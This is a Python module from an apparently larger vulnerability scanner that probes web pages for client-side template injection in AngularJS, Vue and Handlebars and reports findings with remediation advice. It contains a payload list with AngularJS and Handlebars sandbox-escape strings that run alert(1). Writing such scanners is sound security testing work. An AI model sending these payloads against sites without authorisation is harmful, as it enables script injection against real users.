"""
csti_scanner.py — Client-Side Template Injection (CSTI) Scanner
===============================================================
Distinct from SSTI (server-side). CSTI targets AngularJS/Vue sandbox escapes
that execute entirely in the browser — the server never sees the payload.
Detects AngularJS ng-app scope, Vue template markers, and reflected template
expression delimiters in the response.
"""
import re, urllib.parse
from scanners.base_scanner import BaseScanner

CSTI_PAYLOADS = [
    ("{{7*7}}",                          "AngularJS template expression — expects 49 in response"),
    ("{{constructor.constructor('7*7')()|toString}}", "AngularJS sandbox escape"),
    ("{{$eval('7*7')}}",                 "AngularJS $eval injection"),
    ("{{$on.constructor('alert(1)')()}}", "AngularJS sandbox escape v2"),
    ("{{a='constructor';b='alert(1)';a[b]()}}", "AngularJS sandbox escape via constructor"),
    ("{{7*7}}",                          "Vue.js template expression"),
    ("${7*7}",                           "ES6 template literal injection"),
    ("{{{7*7}}}",                        "Handlebars unescaped expression"),
    ("{{_openBlock()}}",                 "Vue 3 reactivity probe"),
    ("{{_observe}}",                     "Vue reactivity detection"),
    ("{{__ob__}}",                       "Vue observer detection"),
    ("{{$parent.$parent.$options}}",     "Vue component traversal"),
    ("{{#with 'sse' as |obj|}}{{obj.constructor.constructor('alert(1)')()}}{{/with}}", "Handlebars SSTI escape"),
    ("{{7*7}}",                          "Generic template expression"),
]

FRAMEWORK_MARKERS = {
    "angular": ["ng-app", "ng-controller", "ng-model", "angular.js", "angular.min.js",
                "x-ng-", "data-ng-", "@angular/", "angularjs"],
    "vue":     ["v-bind", "v-model", "v-for", "v-if", "vue.js", "vue.min.js",
                "Vue.createApp", "createApp(", "@vue/"],
    "react":   ["react.js", "react.min.js", "ReactDOM", "data-reactroot"],
    "handlebars": ["handlebars", "Handlebars", "{{", "{{{", "template: Handlebars"],
}


class CstiScanner(BaseScanner):
    SCANNER_NAME = "Client-Side Template Injection (CSTI) Scanner"
    _SCANNER_KEY = "csti"

    def __init__(self, scan_id, target, domain, **kwargs):
        super().__init__(scan_id, target, domain, **kwargs)

    def run(self) -> list:
        self.log("INFO", f"[CSTI] Scanning for client-side template injection on {self.target}...")
        html, status = self._make_request(self.target)
        if html is None:
            self.log("WARNING", f"[CSTI] Error fetching page")
            return self.vulns

        detected_fw = []
        html_lower = html.lower()
        for fw, markers in FRAMEWORK_MARKERS.items():
            if any(m.lower() in html_lower for m in markers):
                detected_fw.append(fw)
                self.log("INFO", f"[CSTI] Detected framework: {fw}")

        if not detected_fw:
            self.log("SUCCESS", "[CSTI] No client-side template frameworks detected.")
            return self.vulns

        parsed = urllib.parse.urlparse(self.target)
        qs = urllib.parse.parse_qsl(parsed.query)

        tested = False
        for k, v in qs[:3]:
            for payload, desc in CSTI_PAYLOADS:
                injected = [(k_p, payload if k_p == k else v_p) for k_p, v_p in qs]
                url = parsed._replace(query=urllib.parse.urlencode(injected)).geturl()
                resp, rstatus = self._make_request(url)
                if resp is None:
                    continue
                tested = True
                if "49" in resp and payload in ("{{7*7}}", "${7*7}"):
                    self.add_vuln(
                        title=f"CSTI Confirmed — Template Expression Evaluated in `{k}`",
                        severity="High",
                        category="Client-Side Template Injection",
                        cvss_score=8.0,
                        description=f"Injecting `{payload}` into `{k}` caused the server to "
                            f"reflect `49` — confirming the template engine evaluated `7*7`. "
                            f"Detected framework(s): {', '.join(detected_fw)}.\n\n"
                            "CSTI enables arbitrary JavaScript execution in the victim's browser "
                            "via sandbox escape payloads.",
                        remediation="1. Never render raw user input inside AngularJS/Vue templates.\n"
                            "2. Use Angular's DomSanitizer / Vue's v-text instead of v-html.\n"
                            "3. Set Angular's $compileProvider.debugInfoEnabled(false).\n"
                            "4. Upgrade to Angular 2+ (no longer uses string-based templates).",
                        evidence=f"Parameter `{k}` evaluated `{payload}` to `49` in response",
                        payload=payload,
                        request_details=f"GET {url}",
                        response_details=resp[:500],
                        confidence="Confirmed",
                    )
                    self.log("CRITICAL", f"[CSTI] Expression evaluated in `{k}`!")
                    return self.vulns
                elif payload in resp and "{{" in resp:
                    self.add_vuln(
                        title=f"Template Delimiter Reflected in `{k}` — Possible CSTI",
                        severity="Medium",
                        category="Client-Side Template Injection",
                        cvss_score=5.3,
                        description=f"Template payload `{payload}` was reflected back in the "
                            f"response. If the page uses {', '.join(detected_fw)}, the browser "
                            "may evaluate this as a live template expression.",
                        remediation="Sanitize and encode template delimiters ({{ }}) in user output.",
                        evidence=f"Payload `{payload}` reflected in response",
                        payload=payload,
                        confidence="Medium",
                    )

        if detected_fw:
            self.add_vuln(
                title=f"Client-Side Template Framework Detected: {', '.join(fw.title() for fw in detected_fw)}",
                severity="Low",
                category="Client-Side Template Injection",
                cvss_score=0.0,
                description=f"Page uses {', '.join(detected_fw)} — manual CSTI testing recommended "
                    "via Burp Suite with payloads: `{{constructor.constructor('alert(1)')()}}` (AngularJS) "
                    "or `{{_openBlock()}}` (Vue 3).",
                remediation="Audit all template rendering paths for user-controlled input.",
                confidence="Info",
            )

        self._test_angular_sandbox_escape(detected_fw, qs, parsed)
        self._test_vue_template_injection(detected_fw, qs, parsed)

        if not self.vulns:
            self.log("SUCCESS", "[CSTI] No CSTI vulnerabilities detected.")
        return self.vulns

    def _test_angular_sandbox_escape(self, detected_fw, qs, parsed):
        if "angular" not in detected_fw:
            return
        angular_payloads = [
            "{{constructor.constructor('alert(1)')()}}",
            "{{$on.constructor('alert(1)')()}}",
            "{{a='constructor';b='alert(1)';a[b]()}}",
        ]
        for k, v in qs[:2]:
            for payload in angular_payloads:
                injected = [(k_p, payload if k_p == k else v_p) for k_p, v_p in qs]
                url = parsed._replace(query=urllib.parse.urlencode(injected)).geturl()
                resp, status = self._make_request(url)
                if resp and payload[:30] in resp:
                    self.add_vuln(
                        title=f"Angular Sandbox Escape Possible via `{k}`",
                        severity="Critical",
                        category="Client-Side Template Injection",
                        cvss_score=9.3,
                        description=f"Angular sandbox escape payload `{payload[:60]}...` reflected via `{k}`. "
                            "If AngularJS evaluates this, arbitrary JS execution is possible.",
                        remediation="Upgrade to Angular 2+ or disable string-based template compilation.",
                        evidence=f"Angular sandbox escape payload reflected: {payload[:60]}",
                        payload=payload,
                        confidence="High",
                    )

    def _test_vue_template_injection(self, detected_fw, qs, parsed):
        if "vue" not in detected_fw:
            return
        vue_payloads = [
            "{{_openBlock()}}",
            "{{__ob__}}",
            "{{$parent.$parent.$options}}",
        ]
        for k, v in qs[:2]:
            for payload in vue_payloads:
                injected = [(k_p, payload if k_p == k else v_p) for k_p, v_p in qs]
                url = parsed._replace(query=urllib.parse.urlencode(injected)).geturl()
                resp, status = self._make_request(url)
                if resp and payload[:20] in resp:
                    self.add_vuln(
                        title=f"Vue.js Template Injection Possible via `{k}`",
                        severity="High",
                        category="Client-Side Template Injection",
                        cvss_score=7.5,
                        description=f"Vue.js reactivity payload `{payload}` reflected via `{k}`. "
                            "May indicate Vue template injection if the expression is evaluated.",
                        remediation="Use v-text instead of {{ }} interpolation for user-controlled data.",
                        evidence=f"Vue payload reflected: {payload}",
                        payload=payload,
                        confidence="Medium",
                    )
